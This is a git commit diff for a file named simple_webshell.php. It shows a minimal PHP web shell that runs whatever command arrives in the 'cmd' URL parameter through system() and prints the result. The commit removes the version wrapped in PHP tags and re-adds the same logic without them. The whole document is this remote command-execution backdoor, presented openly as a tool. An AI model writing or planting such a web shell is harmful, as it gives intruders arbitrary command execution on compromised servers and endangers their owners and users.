0eb0d42722e122d58f7fd86ecc7aa6d30e1bdcc0
Es0x <37299770+Es0x@users.noreply.github.com>
2019-01-24 19:04:18 +0100

    Update simple_webshell.php

--- simple_webshell.php
+++ simple_webshell.php
@@ -1,6 +1,3 @@
-
-<?php
-  if(isset($_GET['cmd'])){
-          echo system($_GET['cmd']);
-  } else echo "Missing cmd ...";
-?>
+if(isset($_GET['cmd'])){
+  echo system($_GET['cmd']);
+} else echo "Missing cmd ...";
